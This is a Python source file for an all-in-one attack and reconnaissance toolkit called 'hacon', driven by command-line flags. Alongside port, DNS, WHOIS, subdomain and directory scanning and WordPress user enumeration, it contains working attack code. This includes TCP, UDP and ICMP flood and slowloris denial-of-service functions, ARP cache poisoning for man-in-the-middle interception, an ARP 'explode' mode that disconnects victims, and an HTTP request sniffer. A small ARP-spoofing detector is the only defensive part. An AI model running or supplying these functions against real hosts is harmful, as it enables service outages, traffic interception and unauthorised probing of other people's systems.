import random
import socket
import os
import argparse
from scapy.all import send, IP, ICMP, srp, ARP, Ether, sniff, TCP, UDP, DNS
from scapy_http import http
from prettytable import PrettyTable
from mac_vendor_lookup import MacLookup
import requests
import json
import re
import dns.resolver
import whois
import sys
import time


class color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'




# user agent
user_agents = [
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2."
]





class hacon:
    verbose = 2
    def __init__(self):
        self.verbose = hacon.verbose
        this_dir, this_filename = os.path.split(__file__)
        self.files_and_dirs = os.path.join(this_dir, "wordlists", "files-and-dirs.txt")
        self.subdomains = os.path.join(this_dir, "wordlists", "subdomains.txt")

    def printg(self, string):
        if self.verbose >= 2:
            print(color.OKGREEN + str(string) + color.ENDC)
    

    def printc(self, string):
        if not self.verbose == 0:
            print(color.WARNING + str(string) + color.ENDC)


    def printf(self, string):
        if not self.verbose == 0:
            print(color.FAIL + str(string) + color.ENDC)

    

    def printc(self, string):
        if not self.verbose == 0:
            print(color.BOLD + str(string) + color.ENDC)

    def set_verbose(self, verbose):
        """
        Set verbose
        """
        self.verbose = verbose


    def set_target(self, target):
        """
        Set target
        """
        self.target = target
        self.ip = socket.gethostbyname(self.target)
    
    def get_target(self):
        """
        Get target
        """
        try:
            return self.target
        except:
            raise Exception("Please specify the target")

    def get_ip(self):
        """
        Get ip
        """
        try:
            return self.ip
        except:
            raise Exception("Please specify the target")

    def set_port(self, port):
        """
        Set port
        """
        self.port = port

    def get_port(self):
        """
        Get port
        """
        try:
            return self.port
        except:
            raise Exception("Please specify the port")

    def set_interface(self, interface):
        """
        Set interface
        """
        self.interface = interface

    def get_interface(self):
        """
        Get interface
        """
        try:
            return self.interface
        except:
            raise Exception("Please specify the interface")
    

    def set_gateway(self, gateway):
        """
        Set gateway
        """
        self.gateway = gateway

    def get_gateway(self):
        """
        Get gateway
        """
        try:
            return self.gateway
        except:
            raise Exception("Please specify the gateway")

    def set_url(self):
        """
        Get url
        """

        url = f"http://{self.get_target()}:{self.get_port()}"
        if not self.check_url(url):
            url = f"http://{self.get_target()}:{self.get_port()}"

        if self.get_port() == 80:
            url = url.replace(":80","")
        self.url = url


    def get_url(self):
        """
        Get url
        """
        try:
            return self.url
        except:
            self.set_url()
            return self.url


    def get_ssl(self):
        """
        Get ssl
        """
        url = self.get_url()
        if url.startswith("https"):
            return True
        else:
            return False


    def set_wordpress(self):
        """
        Set wordpress
        """
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        if "wp-" in index.text:
            self.wordpress = True
        else:
            self.wordpress = False

    def get_wordpress(self):
        """
        Get wordpress
        """
        try:
            return self.wordpress
        except:
            self.set_wordpress()
            return self.wordpress

    def check_url(self, url):
        """
        Check url
        """
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except:
            return False

    def tcp_dos_dos(self, amount):
        """
        tcp_dos DoS attack
        """
        
        print()
        self.printg(f"[*] Starting tcp_dos DoS attack on {self.get_target()}-{self.get_port()}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.get_target(), self.get_port()))
        packet = ''
        # loop for continuous sending packets
        for i in range(amount):
            # randomize the length of the packets
            rand_length = random.randint(100, 500)
            # build the packets
            for i in range(1, rand_length):
                packet += 'A'
            # send the packets
            s.send(packet.encode())
        s.close()
        self.printg(f"[*] Finished tcp_dos DoS attack on {self.get_target()}-{self.get_port()}")

    def udp_dos_dos(self, amount):
        """
        udp_dos DoS attack
        """
        
        print()
        self.printg(f"[*] Starting udp_dos DoS attack on {self.get_target()}-{self.get_port()}")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        size = os.urandom(min(65500, 1024))
        # loop for continuous sending packets
        for i in range(amount):
            s.sendto(size, (self.get_target(), self.get_port()))
        s.close()
        self.printg(f"[*] Finished udp_dos DoS attack on {self.get_target()}-{self.get_port()}")


    def icmp_dos_dos(self, amount):
        """
        icmp_dos DoS attack
        """

        print()
        self.printg(f"[*] Starting icmp_dos DoS attack on {self.get_target()}")
        # loop for continuous sending packets
        for i in range(amount):
            send(IP(dst=self.get_target())/ICMP())
        self.printg(f"[*] Finished icmp_dos DoS attack on {self.get_target()}")

    def slowloris_dos(self, amount):
        """
        slowloris_dos attack with user agents
        """
                
        print()
        self.printg(f"[*] Starting slowloris_dos attack on {self.get_target()}-{self.get_port()}")
        
        s_list = []
        for i in range(amount):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.get_target(), self.get_port()))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1".encode())
            s.send(f"User-Agent: {random.choice(user_agents)}".encode())
            s.send(b"Accept-language: en-US,en,q=0.5")
            s_list.append(s)
        for s in list(s_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}".encode())
            except socket.error:
                s_list.remove(s)            
            
        self.printg(f"[*] Finished slowloris_dos attack on {self.get_target()}-{self.get_port()}")

    def web_service_detection(self):
        """
        Web service detection
        """
                
        print()
        self.printg(f"[*] Starting Web service detection on {self.get_target()}")


        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        if "wp-" in index.text:
            self.printc(f"[-] Wordpress detected on {self.get_target()}")
        else:
            self.printf(f"[*] Web service not detected on {self.get_target()}")
        self.printg(f"[*] Finished Web service detection on {self.get_target()}")

    def get_wordpress_user(self):
        """
        Get wordpress user
        """
                        
        print()
        self.printg(f"[*] Starting wordpress user detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})

        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-json/wp/v2/users"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if "id" in r.text:

            self.printc(f"[-] Wordpress user detected on {url2}")
            user_list = json.loads(r.text)
            t = PrettyTable(["ID", "NAME", "URL", "DESCRIPTION", "LINK", "SLUG"])
                
            for user in user_list:
                    
                t.add_row([user["id"], user["name"], user["url"], (user["description"][:40] + "..."), user["link"], user["slug"]])
            self.printc(t)
        else:
            self.printf(f"[*] Wordpress user is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress user detection on {self.get_target()}")


    def wordpress_admin_page_detection(self):
        """
        Wordpress admin page detection
        """
                                    
        print()
        self.printg(f"[*] Starting wordpress admin page detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-admin"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress admin page is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress admin page is not detected on {self.get_target()}")

        self.printg(f"[*] Finished wordpress admin page detection on {self.get_target()}")


    def wordpress_version_detection(self):
        """
        Wordpress version detection
        """
                                
        print()
        self.printg(f"[*] Starting wordpress version detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})

        version = None

        user_agent = random.choice(user_agents)
        match = re.search(
                    'meta name="generator" content="WordPress (.*?)"',
                    str(index.text)
        )
        if match:
            version = match.group(1)
        else:
            url2 = f"{self.get_url()}/index.php/feed"
            r = requests.get(url2, headers={"User-Agent":random.choice(user_agents)},)
            regex = re.compile('generator>https://wordpress.org/\?v=(.*?)<\/generator')
            match = regex.findall(r.text)
            if match != []:
                version = match[0]
            
        if version:
            self.printc(f"[-] Wordpress version detected on {version}")
        else:
            self.printf(f"[*] Wordpress version is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress version detection on {self.get_target()}")


    def wordpress_cron_detection(self):
        """
        Wordpress wp-cron.php detection
        """
                                        
        print()
        self.printg(f"[*] Starting wordpress wp-cron.php detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-cron.php"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress wp-cron.php is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress wp-cron.php is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress wp-cron.php detection on {self.get_target()}")

    
    # wordpress uploads directory detection
    def wordpress_uploads_detection(self):
        """
        Wordpress uploads detection
        """
                                        
        print()
        self.printg(f"[*] Starting wordpress uploads detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-content/uploads/"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress uploads is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress uploads is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress uploads detection on {self.get_target()}")
    

    def wordpress_includes_detection(self):
        """
        Wordpress wp-includes detection
        """
                
        print()
        self.printg(f"[*] Starting wordpress wp-includes detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-includes"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress wp-includes is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress wp-includes is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress wp-includes detection on {self.get_target()}")


    def wordpress_readme_detection(self):
        """
        Wordpress readme.html detection
        """
                        
        print()
        self.printg(f"[*] Starting wordpress readme.html detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/readme.html"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress readme.html is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress readme.html is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress readme.html detection on {self.get_target()}")

    
    def wordpress_xmlrpc_detection(self):
        """
        Wordpress xmlrpc.php detection
        """
                                        
        print()
        self.printg(f"[*] Starting wordpress xmlrpc.php detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/xmlrpc.php"
        r = requests.post(url2, data={"data":"data"}, headers={"User-Agent":user_agent})
        if r.status_code == 200 or r.status_code == 405:
            self.printc(f"[-] Wordpress xmlrpc.php is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress xmlrpc.php is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress xmlrpc.php detection on {self.get_target()}")

    

    def wordpress_feed_detection(self):
        """
        Wordpress feed detection
        """
                                        
        print()
        self.printg(f"[*] Starting wordpress feed detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/feed"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress feed is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress feed is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress feed detection on {self.get_target()}")
    

    def wordpress_forgotten_password_detection(self):
        """
        Wordpress forgotten password detection
        """
                        
        print()
        self.printg(f"[*] Starting wordpress forgotten password detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-login.php?action=lostpassword"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress forgotten password is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress forgotten password is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress forgotten password detection on {self.get_target()}")


    def wordpress_plugins_detection(self):
        """
        Wordpress plugins detection
        """
                                
        print()
        self.printg(f"[*] Starting wordpress plugins detection on {self.get_target()}")
        index = requests.get(self.get_url(), headers={"User-Agent":random.choice(user_agents)})
        user_agent = random.choice(user_agents)
        url2 = f"{self.get_url()}/wp-content/plugins"
        r = requests.get(url2, headers={"User-Agent":user_agent})
        if r.status_code == 200:
            self.printc(f"[-] Wordpress plugins is detected on {url2}")
        else:
            self.printf(f"[*] Wordpress plugins is not detected on {self.get_target()}")
        self.printg(f"[*] Finished wordpress plugins detection on {self.get_target()}")


    def portscan(self, start, end, timeout):
        """
        Scan the target ports
        """

        print()
        self.printg(f"[*] Scanning ports on {self.get_target()}")
        t = PrettyTable(['PORT'])
        for port in range(start, end+1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((self.get_target(), port))
            if result == 0:
                t.add_row([port])
            s.close()
        self.printc(t)
        self.printg(f"[*] Finished port scanning on {self.get_target()}")


    def dns_records_lookup(self):
        """
        DNS records lookup
        """

        print()
        self.printg(f"[*] Starting dns records lookup on {self.get_target()}")
        dns_records = []
        types = ["A", "AAAA", "CNAME", "PTR", "MX", "NS", "TXT", "SOA"]
        datas = []
        t = PrettyTable()
        for type in types:
            try:
                
                dns_records = dns.resolver.resolve(self.get_target(), type)
                data = [str(rdata) for rdata in dns_records]
                    
                data = data[0].split(" ")
                
                datas.append(data)

                
            except dns.resolver.NoAnswer:
                data = [f"Not Found"]
                datas.append(data)



        for each_data_parent in datas:
            for each_data in datas:
                    if len(each_data_parent) > len(each_data):
                        difference = len(each_data_parent) - len(each_data)
                        for i in range(difference):
                            each_data.append("")

        for each_data in datas:
            t.add_column(types[datas.index(each_data)], each_data)
        self.printc(t)
        self.printg(f"[*] Finished dns records lookup on {self.get_target()}")

    
    def my_network_scan(self, parameter, timeout):
        """
        Scan the my network
        """

        print()
        self.printg(f"[*] Scanning network on {self.get_target()}")
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{self.get_target()}/{parameter}")
        result = srp(packet, timeout=timeout, verbose=0)[0]
        t = PrettyTable(['IP', 'MAC', "VENDOR"])
        for sent, received in result:
            t.add_row([received.psrc, received.hwsrc, MacLookup().lookup(received.hwsrc)])
        self.printc(t)
        self.printg(f"[*] Finished my network scanning on {self.get_target()}")


    def get_mac_address(self, target = None):
        """
        Get mac address of target
        """
        print()
        if target is None:
            target = self.get_target()
        self.printg(f"[*] Starting get mac address of target {target}")
        result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target), timeout=3, verbose=0)[0]
        result  = [self.printc(f"[-] Mac address of {target} is {received.hwsrc}") for sent, received in result]
        if len(result) == 0:
            self.printf(f"[*] Mac address of {target} is not found")
        self.printg(f"[*] Finished get mac address of target {target}")



    def get_ip_address(self):
        """
        Get ip address of target
        """
        
        print()
        self.printg(f"[*] Starting get ip address of target {self.get_target()}")
        self.printc(f"[-] IP address of {self.get_target()} is {self.get_ip()}")
        self.printg(f"[*] Finished get ip address of target {self.get_target()}")


    
    def get_whois(self):
        """
        Get whois data of target
        """
        
        print()
        self.printg(f"[*] Starting get whois data of target {self.get_target()}")
        result = whois.whois(self.get_target())
        self.printc(f"[-] Whois data of {self.get_target()} is {result}")
        self.printg(f"[*] Finished get whois data of target {self.get_target()}")

    
    def get_http_headers(self):
        """
        Get http headers of target
        """
        
        print()
        self.printg(f"[*] Starting get http headers of target {self.get_target()}")
        r = requests.get(f"{self.get_url()}/")
        self.printc(f"[-] Http headers of {self.get_target()} is {r.headers}")
        self.printg(f"[*] Finished get http headers of target {self.get_target()}")

    
    def get_http_status(self):
        """
        Get http status of target
        """
        
        print()
        self.printg(f"[*] Starting get http status of target {self.get_target()}")
        r = requests.get(f"{self.get_url()}/")
        self.printc(f"[-] Http status of {self.get_target()} is {r.status_code}")
        self.printg(f"[*] Finished get http status of target {self.get_target()}")

    
    def get_http_content(self):
        """
        Get http content of target
        """
        
        print()
        self.printg(f"[*] Starting get http content of target {self.get_target()}")
        r = requests.get(f"{self.get_url()}/")
        self.printc(f"[-] Http content of {self.get_target()} is {r.text}")
        self.printg(f"[*] Finished get http content of target {self.get_target()}")
    
    def get_http_cookies(self):
        """
        Get http cookies of target
        """
        
        print()
        self.printg(f"[*] Starting get http cookies of target {self.get_target()}")
        r = requests.get(f"{self.get_url()}/")
        self.printc(f"[-] Http cookies of {self.get_target()} is {r.cookies}")
        self.printg(f"[*] Finished get http cookies of target {self.get_target()}")


    def arp_spoofing_detection(self):
        """
        Detect arp spoofing
        """
        print()
        self.printg(f"[*] Starting arp spoofing detection on {self.get_interface()}")
        global arp_spoofing_detected
        arp_spoofing_detected = None

        def control(packet):
            global arp_spoofing_detected
            if arp_spoofing_detected is not None:
                return True
            else:
                return False


        def process_sniffed_packet(packet):
            global arp_spoofing_detected
            if packet.haslayer(ARP) and packet[ARP].op == 2:
                verbose = int(self.verbose)
                self.verbose = 0
                real_mac = self.get_mac_address(packet[ARP].psrc)
                self.verbose = verbose
                response_mac = packet[ARP].hwsrc
                if real_mac != response_mac:
                    arp_spoofing_detected = True
                    self.printc(f"[-] Detected ARP spoofing on {self.get_interface()}")
                else:
                    arp_spoofing_detected = False
                    self.printc(f"[-] No ARP spoofing detected on {self.get_interface()}")

        sniff(iface=self.get_interface(), store=False, stop_filter=control,  prn=process_sniffed_packet)

        self.printg(f"[*] Finished arp spoofing detection on {self.get_interface()}")


    

    def subdomains_detection(self):
        """
        Detect sub domains from self.subdomains
        """
        print()
        self.printg(f"[*] Starting sub domains detection on {self.get_target()}")
        with open(self.subdomains, "r") as f:
            try:
                subdomains = f.readlines()
                total_len = str(len(subdomains))
                ssl = self.get_ssl()
                for subdomain in subdomains:
                    sys.stdout.write("\r" + "[*] Sub domains detection progress " + str(subdomains.index(subdomain)) + "/" + total_len)
                    sys.stdout.flush()
                    if ssl:
                        url = f"https://{subdomain}.{self.get_target()}"
                    else:
                        url = f"http://{subdomain}.{self.get_target()}"
                    if self.check_url(url):
                        self.printc(f"[-] {url}")
            except KeyboardInterrupt:
                pass

        self.printg(f"[*] Finished sub domains detection on {self.get_target()}")


    def files_and_dirs_detection(self):
        """
        Detect files and dirs from self.files_and_dirs
        """
        print()
        self.printg(f"[*] Starting files and dirs detection on {self.get_target()}")
        with open(self.files_and_dirs, "r") as f:
            try:
                files_and_dirs = f.readlines()
                total_len = str(len(files_and_dirs))
                ssl = self.get_ssl()
                for file_and_dir in files_and_dirs:
                    sys.stdout.write("\r" + "[*] Files and dirs detection progress " + str(files_and_dirs.index(file_and_dir)) + "/" + total_len)
                    sys.stdout.flush()
                    if ssl:
                        url = f"https://{self.get_target()}/{file_and_dir}"
                    else:
                        url = f"http://{self.get_target()}/{file_and_dir}"
                    if self.check_url(url):
                        self.printc(f"[-] {url}")
            except KeyboardInterrupt:
                pass

        self.printg(f"[*] Finished files and dirs detection on {self.get_target()}")
    
    def arp_poisoning(self):
        """
        Send ARP poisoning to target
        """

        print()
        target = self.get_target()
        gateway = self.get_gateway()
        self.printg(f"[*] Starting ARP poisoning attack on {self.get_target()}")
        verbose = int(self.verbose)
        self.verbose = 0
        target_mac = self.get_mac_address(self.get_target())
        gateway_mac = self.get_mac_address(self.get_gateway())
        self.verbose = verbose

        try:
            number = 0
            while True:
                send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway),verbose=False)
                send(ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target),verbose=False)
                number += 2
                sys.stdout.write("\r" + "[*] ARP poisoning attack sending packets " + str(number))
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway,hwsrc=gateway_mac),verbose=False,count=6)
            send(ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target,hwsrc=target_mac),verbose=False,count=6)

        print()
        print()
        print()
        self.printg(f"[*] Finished ARP poisoning attack on {target}")

    def arp_poisoning_explode(self):
        """
        Send ARP poisoning to target and explode
        """

        print()
        target = self.get_target()
        gateway = self.get_gateway()
        self.printg(f"[*] Starting ARP poisoning and explode attack on {self.get_target()}")
        verbose = int(self.verbose)
        self.verbose = 0
        real_target_mac = self.get_mac_address(self.get_target())
        real_gateway_mac = self.get_mac_address(gateway)
        self.verbose = verbose

        target_mac =  "57-4B-D0-63-95-37"
        gateway_mac = "4A-D6-FD-72-4F-0F"

        try:
            number = 0
            while True:
                send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway),verbose=False)
                send(ARP(op=2,pdst=gateway,hwdst=gateway_mac,psrc=target),verbose=False)
                number += 2
                sys.stdout.write("\r" + "[*] ARP poisoning and explode attack sending packets " + str(number))
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            send(ARP(op=2,pdst=target,hwdst=real_target_mac,psrc=gateway,hwsrc=real_gateway_mac),verbose=False,count=6)
            send(ARP(op=2,pdst=gateway,hwdst=real_gateway_mac,psrc=target,hwsrc=real_target_mac),verbose=False,count=6)

        print()
        print()
        print()
        self.printg(f"[*] Finished ARP poisoning and explode attack on {target}")

    def http_packet_analyzer(self):
        """
        Analyze HTTP packets
        """
        print()
        self.printg(f"[*] Starting HTTP packet analyzer on {self.get_interface()}")
        
        def analyze_packets(packet):
            if packet.haslayer(http.HTTPRequest):
                print(packet.show())

        sniff(iface=self.get_interface(),store=False,prn=analyze_packets)

        self.printg(f"[*] Finished HTTP packet analyzer on {self.get_interface()}")


    def network_analyzer(self):
        """
        Analyze network packets
        """
        print()
        self.printg(f"[*] Starting network analyzer on {self.get_interface()}")
        
        def analyze_packets(packet):
            if packet.haslayer(ARP):
                self.printc(f"[-] Detected ARP packet")
            if packet.haslayer(IP):
                self.printc(f"[-] Detected IP packet")
            if packet.haslayer(TCP):
                self.printc(f"[-] Detected TCP packet")
            if packet.haslayer(UDP):
                self.printc(f"[-] Detected UDP packet")
            if packet.haslayer(ICMP):
                self.printc(f"[-] Detected ICMP packet")
            if packet.haslayer(DNS):
                self.printc(f"[-] Detected DNS packet")

        sniff(iface=self.get_interface(),store=False,prn=analyze_packets)

        self.printg(f"[*] Finished network analyzer on {self.get_interface()}")


        
    def arguments(self, arguments = None):
        """
        Parse the arguments
        """

        self.printc("""
           __   __       
|__|  /\  /  ` /  \ |\ | 
|  | /~~\ \__, \__/ | \| 

atadogan06@gmail.com - onuratakan

        """)
        

        parser = argparse.ArgumentParser()


        parser.add_argument("-v", "--verbose", type=int, default = hacon.verbose, help="increase output verbosity")

        parser.add_argument('-t', '--target', type=str, help='Target address')
        parser.add_argument('-g', '--gateway', type=str, help='Gateway address')
        parser.add_argument('-p', '--port', type=int, help='Port number')


        parser.add_argument('-tcpd', '--tcp_dos', type=int, nargs=1, metavar="Amount", help='tcp_dos DoS attack')
        parser.add_argument('-udpd', '--udp_dos', type=int, nargs=1, metavar="Amount", help='udp_dos DoS attack')
        parser.add_argument('-icmpd', '--icmp_dos', type=int, nargs=1, metavar="Amount", help='icmp_dos DoS attack')
        parser.add_argument('-slowlorisd', '--slowloris_dos', type=int, nargs=1, metavar="Amount", help='slowloris_dos attack')

        parser.add_argument('-wsd', '--webservicedetection', action="store_true", help='Web service detection')

        parser.add_argument('-wpus', '--wordpressuser', action="store_true", help='Wordpress user detection with json')
        parser.add_argument('-wpap', '--wordpressadminpage', action="store_true", help='Wordpress admin page detection')
        parser.add_argument('-wpv', '--wordpressversion', action="store_true", help='Wordpress version detection')
        parser.add_argument('-wpc', '--wordpresscron', action="store_true", help='Wordpress cron detection')
        parser.add_argument('-wpup', '--wordpressuploads', action="store_true", help='Wordpress upload detection')
        parser.add_argument('-wpi', '--wordpressincludes', action="store_true", help='Wordpress detection')
        parser.add_argument('-wpr', '--wordpressreadme', action="store_true", help='Wordpress readme detection')
        parser.add_argument('-wpx', '--wordpressxmlrpc', action="store_true", help='Wordpress xmlrpc detection')
        parser.add_argument('-wpfe', '--wordpressfeed', action="store_true", help='Wordpress feed detection')
        parser.add_argument('-wpfp', '--wordpressforgotten', action="store_true", help='Wordpress forgotten password detection')
        

        parser.add_argument('-ps', '--portscan', nargs=3, metavar=("Start", "End", "Timeout"), help='Scan ports')



        parser.add_argument('-dnsrl', '--dnsrecordslookup', action="store_true", help='DNS records lookup')


        parser.add_argument('-ns', '--mynetworkscan', nargs=2, metavar=("24/12/6", "Timeout"), help='Scan network')

        parser.add_argument('-gm', '--getmac', action="store_true", help='Get mac address')

        parser.add_argument('-gi', '--getip', action="store_true", help='Get ip address')

        parser.add_argument('-gw', '--getwhois', action="store_true", help='Get whois data')

        parser.add_argument('-ghttph', '--gethttpheaders', action="store_true", help='Get http headers')

        parser.add_argument('-ghttps', '--gethttpstatus', action="store_true", help='Get http status')

        parser.add_argument('-ghttpcontent', '--gethttpcontent', action="store_true", help='Get http content')

        parser.add_argument('-ghttpcookie', '--gethttpcookies', action="store_true", help='Get http cookies')


        parser.add_argument('-i', '--interface', type=str, help='Interface')
        parser.add_argument('-arpsd', '--arpspoofingdetect', action="store_true", help='ARP spoofing detector')

        parser.add_argument('-s', '--subdomains', action="store_true", help='Sub domains file')
        parser.add_argument('-f', '--filesanddirs', action="store_true", help='Files and dirs file')


        parser.add_argument('-arpp', '--arpspoosoning', action="store_true", help='ARP spoofing')

        parser.add_argument('-arppe', '--arpspoosoningexplode', action="store_true", help='ARP spoofing and explode')

        parser.add_argument('-httppa', '--httppacketanalyzer', action="store_true", help='HTTP packet analyzer')

        parser.add_argument('-na', '--networkanalyzer', action="store_true", help='Network analyzer')


        if not arguments is None:
            args = parser.parse_args(arguments.split(" "))
        else:
            args = parser.parse_args()
            if len(sys.argv) < 2:
                parser.print_help()


        self.set_verbose(args.verbose)

        
        if not args.target is None:
            self.set_target(args.target)

        if not args.gateway is None:
            self.set_gateway(args.gateway)
        
        if not args.interface is None:
            self.set_interface(args.interface)
        
        if not args.port is None:
            self.set_port(args.port)


        if args.wordpressuser or args.wordpressadminpage or args.wordpressversion or args.wordpresscron or args.wordpressuploads or args.wordpressincludes or args.wordpressreadme or args.wordpressxmlrpc or args.wordpressfeed or args.wordpressforgotten:
            if self.get_wordpress():
                if args.wordpressuser:
                    self.get_wordpress_user()
                if args.wordpressadminpage:
                    self.wordpress_admin_page_detection()
                if args.wordpressversion:
                    self.wordpress_version_detection()          
                if args.wordpresscron:
                    self.wordpress_cron_detection()                  
                if args.wordpressuploads:
                    self.wordpress_uploads_detection()    
                if args.wordpressincludes:
                    self.wordpress_includes_detection()     
                if args.wordpressreadme:
                    self.wordpress_readme_detection()
                if args.wordpressxmlrpc:
                    self.wordpress_xmlrpc_detection()
                if args.wordpressfeed:
                    self.wordpress_feed_detection() 
                if args.wordpressforgotten:
                    self.wordpress_forgotten_password_detection()
            else:
                self.printf(f"[*] Wordpress is not detected on {self.get_target()}")

             
                    

        if not args.tcp_dos is None:
            self.tcp_dos_dos(args.tcp_dos[0])
        if not args.udp_dos is None:
            self.udp_dos_dos(args.udp_dos[0])
        if not args.icmp_dos is None:
            self.icmp_dos_dos(args.icmp_dos[0])
        if not args.slowloris_dos is None:
            self.slowloris_dos(args.slowloris_dos[0])

        if args.webservicedetection:
            self.web_service_detection()




        if not args.portscan is None:
            self.portscan(int(args.portscan[0]), int(args.portscan[1]), float(args.portscan[2]))


        if args.dnsrecordslookup:
            self.dns_records_lookup()
        
        if not args.mynetworkscan is None:
            self.my_network_scan(args.mynetworkscan[0], float(args.mynetworkscan[1]))


        if args.getmac:
            self.get_mac_address()

        if args.getip:
            self.get_ip_address()


        if args.getwhois:
            self.get_whois()

        if args.gethttpheaders:
            self.get_http_headers()

        if args.gethttpstatus:
            self.get_http_status()

        if args.gethttpcontent:
            self.get_http_content()
        
        if args.gethttpcookies:
            self.get_http_cookies()


        if args.arpspoofingdetect:
            self.arp_spoofing_detection()


        if args.filesanddirs:
            self.files_and_dirs_detection()

        if args.subdomains:
            self.subdomains_detection()

        if args.arpspoosoning:
            self.arp_poisoning()
        if args.arpspoosoningexplode:
            self.arp_poisoning_explode()

        if args.httppacketanalyzer:
            self.http_packet_analyzer()

        if args.networkanalyzer:
            self.network_analyzer()



HACON = hacon()

